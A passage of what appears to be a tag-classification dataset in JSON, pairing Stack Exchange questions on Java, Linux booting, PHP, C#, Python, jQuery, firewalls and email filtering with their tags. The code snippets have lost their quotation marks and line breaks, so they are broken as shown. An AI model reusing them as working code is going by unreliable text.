    "source": "Where can I find good example of techniques to compact data in-memory? <eos> I'm writing a Java framework to manipulate a large amount of data in-memory, where many cells that are near each other will have the same value.I'm looking for algorithms and/or techniques specially designed to eliminate those duplication while maintaining fast in-memory read access speed. That is, techniques that keeps an O(1) read-access speed.My data is store in immutable objects, to allow fast multi-threading. The data itself can be anything, from 4 bits-per-cell to doubles to arrays of beans, etc.",
    "target": "java;performance;compression"
  },
  {
    "id": "_unix.185144",
    "source": "Old HDD with arch linux on new machine won't boot <eos> I am a bit of a newbie when it comes to migrations. I had an old machine whose PSU crapped out. So I took whatever I could salvage (i.e. RAM, gfx card and the HDD which still had my arch installation) and merged it into a new machine. When I try to boot up the machine, it says cannot find root device with UUID-xxxxxx and it drops me into a recovery shell. After a bit of fiddling around I found out that the machine does boot into the fallback image and everything works perfectly. But when I reboot and try to boot into the normal image it says the same thing again. I am a bit lost as to what is going on. Could someone explain to me what went wrong and how I can go about fixing this? Also, I am writing this from the new machine in the fallback image.Cheers!Edits :/etc/fstab# UUID=2932dc14-2339-4509-aa13-4131764a9bfe/dev/sda5               /           ext4        rw,relatime,data=ordered    0 1# UUID=ed251836-86aa-40ab-bd1f-b6f40937cb72/dev/sda1               /boot       ext2        rw,relatime 0 2# UUID=c2a8e803-2197-4130-99f3-6a43cfb43e73/dev/sda7               /home       ext4        rw,relatime,data=ordered    0 2#aravind@husker:/home/aravind/Work/  /home/aravind/Work   fuse.sshfs  noauto,x-systemd.automount,_netdev,users,IdentityFile=/home/aravind/.ssh/id_rsa,allow_other,reconnect,workaround=all   0   0/var/log/dmesg.logThere is no dmesg.log or boot.log in /var/log/BootloaderGrubBootloader - config /boot/grub/grub.cfg## DO NOT EDIT THIS FILE## It is automatically generated by grub-mkconfig using templates# from /etc/grub.d and settings from /etc/default/grub#### BEGIN /etc/grub.d/00_header ###insmod part_gptinsmod part_msdosif [ -s $prefix/grubenv ]; then  load_envfiif [ ${next_entry} ] ; then   set default=${next_entry}   set next_entry=   save_env next_entry   set boot_once=trueelse   set default=0fiif [ x${feature_menuentry_id} = xy ]; then  menuentry_id_option=--idelse  menuentry_id_option=fiexport menuentry_id_optionif [ ${prev_saved_entry} ]; then  set saved_entry=${prev_saved_entry}  save_env saved_entry  set prev_saved_entry=  save_env prev_saved_entry  set boot_once=truefifunction savedefault {  if [ -z ${boot_once} ]; then    saved_entry=${chosen}    save_env saved_entry  fi}function load_video {  if [ x$feature_all_video_module = xy ]; then    insmod all_video  else    insmod efi_gop    insmod efi_uga    insmod ieee1275_fb    insmod vbe    insmod vga    insmod video_bochs    insmod video_cirrus  fi}if [ x$feature_default_font_path = xy ] ; then   font=unicodeelseinsmod part_msdosinsmod ext2set root='hd0,msdos5'if [ x$feature_platform_search_hint = xy ]; then  search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos5 --hint-efi=hd0,msdos5 --hint-baremetal=ahci0,msdos5  2932dc14-2339-4509-aa13-4131764a9bfeelse  search --no-floppy --fs-uuid --set=root 2932dc14-2339-4509-aa13-4131764a9bfefi    font=/usr/share/grub/unicode.pf2fiif loadfont $font ; then  set gfxmode=auto  load_video  insmod gfxtermfiterminal_input consoleterminal_output gfxtermset timeout=5### END /etc/grub.d/00_header ###### BEGIN /etc/grub.d/10_linux ###menuentry 'Arch Linux, with Linux core repo kernel' --class arch --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-core repo kernel-true-2932dc14-2339-4509-aa13-4131764a9bfe' {    load_video    set gfxpayload=keep    insmod gzio    insmod part_msdos    insmod ext2    set root='hd0,msdos1'    if [ x$feature_platform_search_hint = xy ]; then      search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  ed251836-86aa-40ab-bd1f-b6f40937cb72    else      search --no-floppy --fs-uuid --set=root ed251836-86aa-40ab-bd1f-b6f40937cb72    fi    echo    'Loading Linux core repo kernel ...'    linux   /vmlinuz-linux root=UUID=2932dc14-2339-4509-aa13-4131764a9bfe ro  quiet    echo    'Loading initial ramdisk ...'    initrd  /initramfs-linux.img}menuentry 'Arch Linux, with Linux core repo kernel (Fallback initramfs)' --class arch --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-core repo kernel-fallback-2932dc14-2339-4509-aa13-4131764a9bfe' {    load_video    set gfxpayload=keep    insmod gzio    insmod part_msdos    insmod ext2    set root='hd0,msdos1'    if [ x$feature_platform_search_hint = xy ]; then      search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  ed251836-86aa-40ab-bd1f-b6f40937cb72    else      search --no-floppy --fs-uuid --set=root ed251836-86aa-40ab-bd1f-b6f40937cb72    fi    echo    'Loading Linux core repo kernel ...'    linux   /vmlinuz-linux root=UUID=2932dc14-2339-4509-aa13-4131764a9bfe ro  quiet    echo    'Loading initial ramdisk ...'    initrd  /initramfs-linux-fallback.img}### END /etc/grub.d/10_linux ###### BEGIN /etc/grub.d/20_linux_xen ###### END /etc/grub.d/20_linux_xen ###### BEGIN /etc/grub.d/30_os-prober ###### END /etc/grub.d/30_os-prober ###### BEGIN /etc/grub.d/40_custom #### This file provides an easy way to add custom menu entries.  Simply type the# menu entries you want to add after this comment.  Be careful not to change# the 'exec tail' line above.### END /etc/grub.d/40_custom ###### BEGIN /etc/grub.d/41_custom ###if [ -f  ${config_directory}/custom.cfg ]; then  source ${config_directory}/custom.cfgelif [ -z ${config_directory} -a -f  $prefix/custom.cfg ]; then  source $prefix/custom.cfg;fi### END /etc/grub.d/41_custom ###### BEGIN /etc/grub.d/60_memtest86+ ###### END /etc/grub.d/60_memtest86+ ###",
    "target": "arch linux;fstab;migration"
  },
  {
    "id": "_softwareengineering.274118",
    "source": "PHP extended class method requires same signature including object class requirement? <eos> Not sure exactly how to phrase the question succinctly for the title.I have a collection class that extends another collection class.The parent collection-class has a method addMember(someClass $obj) that adds an object to the collection.The child collection-class groups objects of the child class of someclass, someClassChild. I thought that a child class's method's signature would pass muster as long as the signature was the same or required children of the classes the parent required.E.g. addMember(someClassChild $obj)But I tried it and I'm getting a warning about strict standards.So then, how to I implement a collection class as a child of another collection class to provide functionality for parent/child base objects?",
    "target": "object oriented;php"
  },
  {
    "id": "_codereview.127606",
    "source": "Supporting all closure options in WinForms MVC application <eos> I have a WinForms MVC application that uses Ninject for it's Dependency Injection (DI) / IoC Container. I have build quite a nice framework that allows the main shell (which uses a Docking Container to house an manipulate windows - like Visual Studio), to manipulate IDocument types (actual documents .txt, .xlsx etc.) and ITool types (my utilities, like file system explorer tree view, Command Window etc.). I communicate from the views (which are blind and deaf to the fact the controllers exist) to their controllers via event handlers. So the architecture is like this: IView.cs:public interface IView{    string DisplayName { get; set; }}IController.cs:public interface IController{    bool IsDirty { get; set; }    IView View { get; }}IDocumentView.cs:public interface IDocumentView : IView, IActivate, IDeactivate{    bool StatusBarVisible { get; set; }}IDocumentController.cs:public interface IDocumentController : IController{    bool Handles(string path);    DocumentView New(string fileName);    DocumentView Open(string path);    void Save();    string FilePath { get; set; }    IEnumerable<DocumentFileType> FileTypes { get; }}I then have an abstract DocumentView class that handles so common behaviors of all IDocument types.DocumentController.cs:public abstract class DocumentController : IDocumentController, IClose, IGuardClose, IDisposable{       // Lots of stuff...}IGuardClose.cs:public interface IGuardClose{    void CanClose(Action<bool> callback);}IClose.cs:public interface IClose{    bool TryClose(object sender, FormClosingEventArgs e);}DocumentView.cs:    [TypeDescriptionProvider(typeof(AbstractControlDescriptionProvider))]    public abstract class DocumentView : DockContent, IDocumentView, IViewManagment    {        public virtual EventHandler OnViewLoaded { get; set; }        public virtual EventHandler OnViewClosing { get; set; }    public virtual EventHandler<EventArgs> ViewActivated { get; set; }    public virtual EventHandler<EventArgs> ViewDeactivate { get; set; }    public abstract string DisplayName { get; set; }    public virtual bool StatusBarVisible { get; set; }}IViewManagement.cs:public interface IViewManagment{    EventHandler OnViewLoaded { get; set; }    EventHandler<FormClosingEventArgs> OnViewClosing { get; set; }}They allow me to wire my controller up to listen for the loaded and losing events triggered from the view without the view knowing anything about it, but herein lies my problem.For my actual IDocumentViews and IDocumentControllers, I inherit from DocumentView and DocumentController respectively. This works well and all is fine, I can open new documents, open from files system you name it. My issue, is to do with closure. If I click the views X button to close the view, I need (and do) let the controller clean up some resources it is using (a FileSystemWatcher for the opened file etc.), but I also need to be able to close the view from the controller, so the TryClose method cannot merely do View.Close() for all calls as clearly this will envolve a stack overflow, as the View.Close() request would lead to another call to the controller TryClose etc. My questions:How can I best implement Controller.TryClose() so it can be used from both the controller and the view, should I have two methods in IClose, CleanUp(), let the controller clean its business and Close() actually close the view as well as clean up?Sometimes the user will close the main shell. Here I can to loop through all open documents and check CanClose() of IGuardClose. Assuming I can easily access the controllers from the main shell in a for loop/foreach loop, how best could I implement a close all (with safety - some documents  are unsaved do you want to save now?)?",
    "target": "c#;winforms;dependency injection"
  },
  {
    "id": "_codereview.82261",
    "source": "Reading an Excel file and comparing the amino acid sequence of each data pair <eos> Since I am fairly new to Python I was wondering whether anyone can help me by making the code more efficient. I know the output stinks; I will be using Pandas to make this a little nicer.from xlrd import *def main():    '''This Proram reads input (A:clone name, B:sequence, C:elisa) from an    Excel file and makes a cross comparison of each sequence pair'''    book = open_workbook(mtask.xlsx)    Input = book.sheet_by_index(0)    # naming of input data    a = (Input.col_values(0,0))    b = (Input.col_values(1,0))    c = (Input.col_values(2,0))    # make dictionary: keys are seq numbers; values are residues     y = {}    for i in range(Input.nrows):        x = []        for j in b[i]:            x.append(j)        y[a[i]] = x    # comparison of sequences and extraction of mutations for each sequence pair    List = []    for shit in range(Input.nrows):        for seq in range(Input.nrows):            seq12 = []            z = 0            for i in y[a[seq]]:                try:                    for j in y[a[shit]][z]:                         if i == j:                             seq12.append(i.lower()+j.lower())                         else:                             seq12.append(i+j)                    z = z+1                except IndexError:                     print(oops)            lib = [a[seq],a[shit],c[seq],c[shit]]            for position, item in enumerate(seq12):                if item.isupper():                    x = (str(item[0])+str(position+1)+str(item[1]))                    lib.append(x)            List.append(lib)    # comparison of sequences and extraction of mutations for each sequence pair    dic = {}    for i in range(Input.nrows*Input.nrows):        x = []        for j in List[i]:            x.append(j)        dic[i] = x    # sort    a = []    for i in dic.values():        a.append(i)    # collect number of mutations in data files    import csv    null = []    one = []    two = []    three = []    four = []    five = []    six = []    seven = []    eight = []    nine = []    ten = []    for i in range(Input.nrows*Input.nrows):        if len(a[i]) <= 4:            null.append(a[i])            with open(no_mut.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(null)        elif len(a[i]) == 5:            one.append(a[i])            with open(one.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(one)        elif len(a[i]) == 6:            two.append(a[i])            with open(two.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(two)        elif len(a[i]) == 7:            three.append(a[i])            with open(three.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(three)        elif len(a[i]) == 8:            four.append(a[i])            with open(four.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(four)        elif len(a[i]) == 9:            five.append(a[i])            with open(five.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(five)        elif len(a[i]) == 10:            six.append(a[i])            with open(six.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(six)        elif len(a[i]) == 11:            seven.append(a[i])            with open(seven.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(seven)        elif len(a[i]) == 12:            eight.append(a[i])            with open(eight.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(eight)        elif len(a[i]) == 13:            nine.append(a[i])            with open(nine.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(nine)        elif len(a[i]) == 14:            ten.append(a[i])            with open(ten.csv, w, newline=) as f:                writer = csv.writer(f)                writer.writerows(ten)main()",
    "target": "python;beginner;excel;bioinformatics;pandas"
  },
  {
    "id": "_codereview.19799",
    "source": "A jQuery utility plugin template <eos> I need to write a jQuery plugin that doesn't take an element to work.Example call:$.funkyTown();... not called like this:$('#foo').funkyTown();...in other words, I need this plugin to act more like a utility plugin (vs. apply itself directly to a matched element(s)).Here's what I have written so far:;(function($, window, document, undefined) {    var console = this.console || { log : $.noop, warn: $.noop }, // http://api.jquery.com/jQuery.noop/    defaults = {        foo : 'bar',        // Callbacks:        onInit : $.noop, // After plugin data initialized.        onAfterInit : $.noop // After plugin initialization.        // Using $.noop shorter than function() {} and slightly better for memory.    },    settings = {},    methods = {        // Initialize!        // Example call:        // $.funkyTown({ foo : 'baz' });        // @constructor        init : function(options) {            settings = $.extend({}, defaults, options);            settings.onInit.call(this, 'that');            console.log('1. init:', settings.foo, _foo_private_method(), methods.foo_public_method());            console.warn('2. I\\'m a warning!');            settings.onAfterInit.call(this);            return this; // Is this needed for chaining?        },        // Example call:        // console.log($.funkyTown('foo_public_method', 'Wha?'));        foo_public_method : function(arg1) {            arg1 = (typeof arg1 !== 'undefined') ? arg1 : 'Boo!';            return 'foo_public_method(), arg1: ' + arg1;        },        // Might need to give users the option to destroy what this plugin created:        destroy : function() {            // Undo things here.        }    },    // The _ (underscore) is a naming convention for private members.    _foo_private_method = function() {        return '_foo_private_method(), settings.foo: ' + settings.foo;    };    // Method calling logic/boilerplate:    $.funkyTown = function(method) {        if (methods[method]) {            return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));        } else if ((typeof method === 'object') || ( ! method)) {            return methods.init.apply(this, arguments);        } else {            $.error('Method ' + method + ' does not exist on jQuery.funkyTown.');        }    };}(jQuery, window, document));The above is called like so:$(document).ready(function() {    // Calls init and modifies default options:    $.funkyTown({ foo : 'baz' });    // Access to public method:    console.log($.funkyTown('foo_public_method', 'Wha?'));});My questions:Do you see anything out of the ordinary with my above plugin template? If so, how could it be improved?Related to #1 above: As you can probably see, I'm trying to account for the various needs like passing options, private and public methods and console handling... What am I missing in terms of useful features? This line $.funkyTown = function(method) { makes the javascript linter throw a warning: warning: anonymous function does not always return a value; is there anyway for me to fix this? Could I just add return false to the end (right before the closing };? Update: Looks like I just needed to use a different tool.Because I'm writing a utility plugin (one that will never be used directly on an element) do I still need to return this in my public methods in order to make things chainable (see the return this; // Is this needed for chaining? line of code above)? Should I even worry about chaining for this type of plugin?Could you provide any other feedback to help me improve my code?What's the easiest/best way to pass settings from init to other private and public functions? Normally, I'd use .data() on $(this) to store settings and other stateful vars... Because there's not element, should I just pass settings as an argument to the other methods? Update: Doi! This was an easy one! I simply needed to initialize my settings outside of my public methods object.UPDATE 1:I've updated my code (above) to reflect the things I've learned (i.e. the strike-through lines in numeric list above) since posting this question.I've also added a new feature:;(function($, window, document, undefined) {// ...}(jQuery, window, document));I found that I needed access to window a few times already in my real script... After some Googling, I found this awesome resource:JavaScript Patterns Collection... which led me to here:Lightweight - perfect as a generic template for beginners and above... specifically:// the semi-colon before the function invocation is a safety// net against concatenated scripts and/or other plugins// that are not closed properly.;(function ( $, window, document, undefined ) {    // undefined is used here as the undefined global    // variable in ECMAScript 3 and is mutable (i.e. it can    // be changed by someone else). undefined isn't really    // being passed in so we can ensure that its value is    // truly undefined. In ES5, undefined can no longer be    // modified.    // window and document are passed through as local    // variables rather than as globals, because this (slightly)    // quickens the resolution process and can be more    // efficiently minified (especially when both are    // regularly referenced in your plugin).})( jQuery, window, document );Update 2:I've added callbacks. I've also decided to use $.noop in place of function() {}:... typing $.noop is 6 chars shorter than function(){}. Also if you  use this everywhere instead of creating new, anonymous, empty  functions, you'll slightly cut down on memory.  MarcoNow I'm wondering what my callbacks should return in a utility plugin? Sending this doesn't seem that useful.",
    "target": "javascript;jquery"
  },
  {
    "id": "_codereview.88060",
    "source": "Uses game API to post stats about user when requested <eos> First Python script, so my code is pretty laughable. Sensitive information has been redacted. One thing that I'd like to point out is that there is an inconsistent use of '' and . This is an old habit that I really need to break. import sys, osimport prawimport timeimport sqlite3import reimport requestsimport jsonfrom datetime import datetime,timedeltaUSERNAME  = PASSWORD  = time_zone = updateTime = datetime.utcnow() - timedelta(hours=7)time_stamp = updateTime.strftime(%m-%d-%y %I:%M:%S %p PST :: )sql = sqlite3.connect((os.path.join(sys.path[0],'redacted-sql.db')))cur.execute('CREATE TABLE IF NOT EXISTS oldmentions(ID TEXT)')sql.commit()r = praw.Reddit()r.login(USERNAME, PASSWORD) def stats():    mentions = list(r.get_mentions(limit=None))    unreads = list(r.get_unread(limit=None))    for mention in mentions:        mid = mention.id        try:            pauthor = mention.author.name        except AttributeError:            #author is deleted            continue        cur.execute('SELECT * FROM oldmentions WHERE ID=?', [mid])        if cur.fetchone():            #post already in database             continue        pbody = mention.body.lower().replace('\\n', ' ').encode('utf-8')        pbody_strip_1 = re.sub(r'[^A-Za-z0-9 ]+', '', str(pbody_strip_0))        pbody_words = pbody_strip_1.split(' ')        pbody_words_1 = filter(None, pbody_words)        try:            if pbody_words_1[pbody_words_1.index('redactedbot')-1] == u:                charname = pbody_words_1[pbody_words_1.index('redactedbot')+1]            else:                cur.execute('INSERT INTO oldmentions VALUES(?)', [mid])                sql.commit()                mention.mark_as_read()                continue        except (IndexError, KeyError, ValueError):            cur.execute('INSERT INTO oldmentions VALUES(?)', [mid])            sql.commit()            mention.mark_as_read()            continue        cns_char_dic = json.loads(cns_char_j)        char_exist = cns_char_dic['returned']        if char_exist != 1:            cur.execute('INSERT INTO oldmentions VALUES(?)', [mid])            sql.commit()            mention.mark_as_read()            continue        char_case = cns_char_dic['person_list'][0]['name']['first']        char_id = cns_char_dic['person_list'][0]['person_id']        char_creation = time.strftime(time_format, time.localtime(float(cns_char_dic['person_list'][0]['times']['creation'])))        char_login = time.strftime(time_format, time.localtime(float(cns_char_dic['person_list'][0]['times']['last_login'])))        char_login_count = int(float(cns_char_dic['person_list'][0]['times']['login_count']))        char_h, char_m = divmod(int(cns_char_dic['person_list'][0]['times']['minutes_played']), 60)        if char_h == 1:            hours =  hour         else:            hours =  hours         if char_login_count == 1:            logins =  login)        else:            logins =  logins)        char_rank = cns_char_dic['person_list'][0]['battle_rank']['value']        post_reply_rank = Battle rank:  + char_rank        if char_rank_next != 0:            post_reply_rank +=  ( + char_rank_next + % to next)        char_faction = cns_char_dic['person_list'][0]['faction']        char_world_id = cns_char_dic['person_list'][0]['world_id']        try:            char_outfit = cns_char_dic['person_list'][0]['outfit_member']            if char_outfit['member_count'] != 1:                   post_reply_outfit = Outfit: [ + str(char_outfit['alias']) + ]  + str(char_outfit['name']) +  ( + {:,}.format(int(char_outfit['member_count'])) +  members)            else:                post_reply_outfit = Outfit: [ + char_outfit['alias'] + ]  + char_outfit['name'] +  ( + char_outfit['member_count'] +  member)        except KeyError:            post_reply_outfit = Outfit: None        try:            char_kills = cns_char_dic['person_list'][0]['stats']['stat_history'][5]['all_time']            char_deaths = cns_char_dic['person_list'][0]['stats']['stat_history'][2]['all_time']        cns_stat_j = cns_stat.text        cns_stat_dic = json.loads(cns_stat_j)        char_stat = cns_stat_dic['persons_stat_list']        if pauthor.lower() != USERNAME.lower():            try:                mention.reply(post_reply)                mention.mark_as_read()            except APIException:                pass            cur.execute('INSERT INTO oldmentions VALUES(?)', [mid])            sql.commit()        else:            print(time_stamp + 'Will not reply to myself')            cur.execute('INSERT INTO oldmentions VALUES(?)', [mid])            sql.commit()            mention.mark_as_read()",
    "target": "python;json;api"
  },
  {
    "id": "_webapps.44710",
    "source": "Using Dropbox with multiple cameras <eos> I have a problem with Dropbox Camera Upload: I have an iPad, an iPhone and a Samsung Galaxy Camera, all uploading photos to Dropbox. I would like to create different folders for each one of them: uploads from iPad, uploads from iPhone, uploads from Samsung, to divide the photos from each device. Is this possible?",
    "target": "dropbox"
  },
  {
    "id": "_cs.79305",
    "source": "Is it possible to solve the halting-after-$n$ steps problem more efficient than just execute $n$ steps? <eos> The halting-after-$n$ steps problem may be defined as the question if a given turing machine halts after a maximum of $n\\in\\mathbb{N}$ steps. Is it theoretically possible to solve this problem in general in less than $n$ execution steps (just execution the program) or can't this be done? If not, why not?Thank you",
    "target": "turing machines;halting problem"
  },
  {
    "id": "_unix.197057",
    "source": "Filter grep output <eos> Using grep val index.php I get the list<td class=val>   7.6</td><td class=val>  58</td><td class=val>1013.8 </td><td class=val> 1020 </td><td class=val>   0.2</td><td class=val>   2.4</td>I'd like to filter and get only the value of the first td, that is, 7.6 and save it to use later with echo.That value could change, so grep 7.6 is not good.(!) The line in php containing that tag is line 42. A solution without this information could be better since the line number could change. But for a while, using its number can be a temporary solution.I searched for a solution but I only found complex ones.",
    "target": "scripting;grep"
  },
  {
    "id": "_cs.50505",
    "source": "How do I verify that a DFA is equivalent to a NFA? <eos> I'm learning how to convert NFAs to DFAs and I want to make sure I'm doing it right. Obviously, going back in the other direction isn't a thing. Does anyone know of an algorithm to check that a DFA is equivalent to a NFA?",
    "target": "automata;finite automata;proof techniques;nondeterminism"
  },
  {
    "id": "_cseducators.728",
    "source": "When should I scrap my projector for a blackboard? <eos> These days, we've got all this fancy, new-fangled technology. We've got live coding, we've got presentations, we've got remote desktop adapted for classroom use. There seems to be a tool for every teaching problem. But when should we ignore the KnowledgeInjector2000TM and instead use the good old blackboard?More specifically, which concepts are easier to explain with a blackboard and how would you use a blackboard to explain them?",
    "target": "lecture tools"
  },
  {
    "id": "_softwareengineering.318549",
    "source": "How should I represent mutable boolean state? <eos> When I have some object with boolean state that can be changed (like a checkbox's checkedness), there are several ways I can expose it.Getter property, Setter methodbool IsChecked { get { ... } }void SetChecked(bool checked) { ... }Getter property, Set true method, Set false methodbool IsChecked { get { ... } }void Check() { ... }void Uncheck() { ... }Getter, setter propertybool IsChecked { get { ... } set { ... } }  Is there a good design or logical reason to use one of these ways in particular? (I apologize if this question is too opinion-based/open-ended)",
    "target": "c#;design patterns"
  },
  {
    "id": "_unix.134010",
    "source": "Check if a variable contains only what I want, and nothing else <eos> I'm writing a script to build a software from sources, and there's a --platforms option. I would like to allow the user to select multiple items, but I don't know how to prevent them from making a mistake.Example:read -p For what platforms do you wish to build [mac/win/linux32/linux64/all] ? if [[ -n `echo $REPLY | grep 'win\\|mac\\|linux32\\|linux64\\|all` ]] ; then    echo okelse     echo not okfiIf the user answers linux32, it should be OK (and it is)If the user answers linux32,mac, it should be OK (and it is)If the user answers lulz, it should NOT be OK (and it is not)If the user answers linux32,lulz, it should NOT be OK (and it is, that's my issue)I was wondering if you knew a way to allow the user to input whatever they want separated by commas, but only if it's one of the options the script is offering, so in this case linux32 linux64 mac win all. Maybe with case there is a way to allow multiple inputs, or maybe add an elif $REPLY contains anything else than what we want. Another idea, could awk be used? I can't figure out myself how to do that.",
    "target": "bash;grep"
  },
  {
    "id": "_cs.68861",
    "source": "Show that there are $(n-1)!/2$ distinct tours for a Euclidean traveling salesman problem on $n$ points? <eos> The question is to show that there are $(n-1)!/2$ distinct tours for a Euclidean traveling salesman problem (ETSP) on $n$ points.My attempt was using induction. So I start by:If $n=3$, then we have a triangle and there is only one tour.Assume that there are $(n-1)!/2$ distinct tours for a ETSP on $n$ points. Prove that there are $n!/2$ distinct tours for a ETSP on $n+1$ points?Here I proceed like this: for each tour $t$ from the $(n-1)!/2$ distinct tours do: add one point $n+1$.for each edge $e=\\{v_i, v_j\\}$ in $t$ do: remove $e$ and create two edges $e_1=\\{n+1,v_i\\}$ and $e_2=\\{n+1, v_j\\}$. We have a new tour and in total we can create $n$ distinct tours.Since there are $(n-1)!/2$ distinct tours, we will have $n(n-1)!/2=n!/2$ distinct tours.This gives the desired result but somehow long and complicated.",
    "target": "traveling salesman"
  },
  {
    "id": "_unix.19829",
    "source": "special character in filename (\\#033OA) <eos> I've got a slight problem with a very stubborn error during an rsync. It's caused by a file with a special character in its filename. There's been others but I could sort that out by doing some conversion in the encoding of the filename. However this one file I can't even find.So here's what rsync says:../.\\#033OA.tex.pyD0MB failed: No such file or directory (2)First thing one notices is that the character code can't be hex or octal so I've googled it and only found this. So it may be a CURSOR UP character (or not). I've triedls -la *`printf '\\033OA'`*to no avail. I've also tried piping the output of ls of that directory to od to no avail.What else can I do? Or what character am I looking for anyway?Thanks",
    "target": "filenames;character encoding;special characters"
  },
  {
    "id": "_unix.302280",
    "source": "UFW (Uncomplicated Firewall) turns off (inactive) after a while <eos> I'm a little lost and hope someone can point me into the right direction to solve my problem. I have a server running with a Debian distribution and I'm using UFW as firewall. The configuration and setup was pretty easy and I started the firewall as documented with:manly@server:~$ sudo ufw enableCommand may disrupt existing ssh connections. Proceed with operation (y|n)? yFirewall is active and enabled on system startupIf I check, if ufw is running I receive (correctly):manly@server:~$ sudo ufw statusStatus: activeTo                         Action      From--                         ------      ----22                         ALLOW       Anywhere80/tcp                     ALLOW       Anywhere22                         ALLOW       Anywhere (v6)80/tcp                     ALLOW       Anywhere (v6)After some time (I check daily), the firewall turns inactive - even without any restart in between -, i.e., status returns inactive:manly@server:~$ sudo ufw statusStatus: inactiveI have no idea why. What can I check to figure out the reasons behind that weird behavior. I'm thankful for any advice!Update:I noticed something, which may help to find a solution. So I start the ufw with the sudo ufw enable in an ssh session. It seems like, that if I keep the ssh session open, the firewall is enabled. If I close the ssh session (exit), the ufw status will be set to inactive after some time. Do I have to start the ufw in any special manner?",
    "target": "linux;debian;firewall;ufw"
  },
  {
    "id": "_webapps.74578",
    "source": "Batch creation of shortened URLs with Goo.gl <eos> I would like to create 20-30 shortened URLs to Google Documents using Google own URL shortener Goo.gl. Does anybody know if this is possible or do I need to enter them one by one?",
    "target": "goo.gl"
  },
  {
    "id": "_webmaster.78152",
    "source": "Resetting sitemap warnings in Webmaster Tools <eos> Back in the day when I was updating my website and had errors, Google Webmaster Tools took note of it and gave my sitemap files warnings.Now I decided to start over new again by uploading brand new sitemaps with today's date stamped on them, and yet I still get the same warnings dated from weeks ago as follows:When we tested a sample of the URLs from your Sitemap, we found that some of the URLs were unreachable. Please check your webserver for possible misconfiguration, as these errors may be caused by a server error (such as a 5xx error) or a network error between Googlebot and your server. All reachable URLs will still be submitted.Some URLs in the Sitemap have a high response time.  Some URLs listed in this Sitemap have a high response time. This may indicate a problem with your server or with the content of the page.I have fixed these issues now, but I don't know how to delete the warnings and make Google re-evaluate my website again. Anyone have any ideas?",
    "target": "google;google search console;sitemap;crawl errors;link submission"
  },
  {
    "id": "_unix.370888",
    "source": "Lock Usb Flash-Drive on Ubuntu Linux <eos> By security request, I need to set up Ubuntu desktops from my network to not allow the use of flashdrives or USB storage devices. But the USB mouse and keyboard should normally be charged. Is there a simple and effective way to prevent the use of these devices?",
    "target": "ubuntu;usb drive;lock"
  },
  {
    "id": "_codereview.82165",
    "source": "Validating JavaScript origins <eos> I need to write a function in Python that makes sure the user entered a valid JavaScript origin. If I understand it correctly, the origin includes the scheme, hostname and port (port and scheme might be implicit, defaulting to 80 and http respectively), so would this be a correct way to validate it?import urlparsedef validate_javascript_origin(origin):    parsed = urlparse.urlsplit(origin)    if parsed.scheme and parsed.scheme not in [http, https]:        raise ValueError(Only the http and https url schemes are supported.)    if not parsed.netloc:        raise ValueError(The origin must include a hostname.)    if parsed.path or parsed.query or parsed.fragment:        raise ValueError(The origin must not contain a path, query string or fragment.)The origin will be used to pass as the preferredOrigin to window.postMessage.The main thing I'm worried about is that I'm not sure how credentials in the url (username:password@example.com) are handled.Going to http://username@frederikcreemers.be, and getting location.originin javascript returns http://frederikcreemers.be, so the origin doesn't include credentials. Would it be sufficient to add a condition like this to the function above:if @ in parsed.netloc:    raise ValueError(The origin must not contain credentials.)",
    "target": "python;validation"
  },
  {
    "id": "_cs.57030",
    "source": "What is the Best and easiest way to create a Classifer for Sentiment Analysis <eos> Sentiment analysis using Machine Learning is a hot topic. In the present situation when a person doesn't have a problem in having the training data set then which way should we create the classifier possibly the NaiveBayes classifier?",
    "target": "machine learning;natural language processing;classification"
  },
  {
    "id": "_cs.32822",
    "source": "Concurrent programming language being Turing-equivalent and difference between Turing-complete and equivalent <eos> In Is concurrent language CCS or CSP turing-equivalent in language power?, the answer says that CCS or CSP is Turing-complete. But that does not seem to answer whether CCS or CCP is Turing-equivalent. According to my understanding, Turing-equivalence and Turing-completeness is a different thing, but I may have been confused. ",
    "target": "computability;programming languages;parallel computing;concurrency;computation models"
  },
  {
    "id": "_unix.3092",
    "source": "Organize Email by Date Using procmail or maildrop <eos> I would like to organize all incoming email into the following directory structure based on the date of the email:ROOT --+-- YYYYMMDD --+-- HH --+-- mm --+-- YYYYMMDD-HHmmSS-000001       |              |        |        |       |              |        |        |      ....       |              |        |        |       |              |        |        +-- YYYYMMDD-HHmmSS-NNNNNN       |              |        +-- mm --       |              +-- HH --+-- mm -- Note that each email will be stored as a separate file and the name of the file is YYYYMMDD-HHmmss-NNNNN, where NNNNN is a running number.Can procmail or maildrop do this? If not, what other options are there?Thanks in advance.",
    "target": "email"
  },
  {
    "id": "_unix.217773",
